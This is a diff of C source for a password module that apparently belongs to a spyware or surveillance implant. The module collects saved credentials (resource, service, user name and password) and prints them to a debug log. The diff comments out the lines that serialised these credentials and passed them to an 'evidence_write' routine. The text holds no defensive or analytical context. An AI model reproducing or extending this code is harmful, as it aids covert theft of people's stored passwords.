@@ -54,7 +54,7 @@ void *module_password_main(void *args)
    debugme("Module PASSWORD started\n");
 
    do {
-      if(!(bio_data = BIO_new(BIO_s_mem()))) break;
+      //if(!(bio_data = BIO_new(BIO_s_mem()))) break;
 
       while(MODULE_PASSWORD.status != MODULE_STOPPING) {
          do {
@@ -68,18 +68,18 @@ void *module_password_main(void *args)
 
             for(listp = list; listp; listp = listp->next) {
                debugme("PASSWORD %s %s %s %s\n", listp->resource, listp->service, listp->user, listp->pass);
-               if(BIO_puts16n(bio_data, listp->resource) == -1) break;
-               if(BIO_puts16n(bio_data, listp->user) == -1) break;
-               if(BIO_puts16n(bio_data, listp->pass) == -1) break;
-               if(BIO_puts16n(bio_data, listp->service) == -1) break;
-               if(BIO_putsep(bio_data) == -1) break;
+               //if(BIO_puts16n(bio_data, listp->resource) == -1) break;
+               //if(BIO_puts16n(bio_data, listp->user) == -1) break;
+               //if(BIO_puts16n(bio_data, listp->pass) == -1) break;
+               //if(BIO_puts16n(bio_data, listp->service) == -1) break;
+               //if(BIO_putsep(bio_data) == -1) break;
             }
             if(listp) break;
 
-            if(!(datalen = BIO_get_mem_data(bio_data, &dataptr))) break;
-            evidence_write(EVIDENCE_TYPE_PASSWORD, NULL, 0, dataptr, (int)datalen);
+            //if(!(datalen = BIO_get_mem_data(bio_data, &dataptr))) break;
+            //evidence_write(EVIDENCE_TYPE_PASSWORD, NULL, 0, dataptr, (int)datalen);
          } while(0);
-         BIO_reset(bio_data);
+         //BIO_reset(bio_data);
 
          for(listp = list; listp;) {
             list = listp;
@@ -98,7 +98,7 @@ void *module_password_main(void *args)
          select(MODULE_PASSWORD.event + 1, &rfds, NULL, NULL, &tv);
       }
    } while(0);
-   if(bio_data) BIO_free(bio_data);
+   //if(bio_data) BIO_free(bio_data);
 
    debugme("Module PASSWORD stopped\n");
 
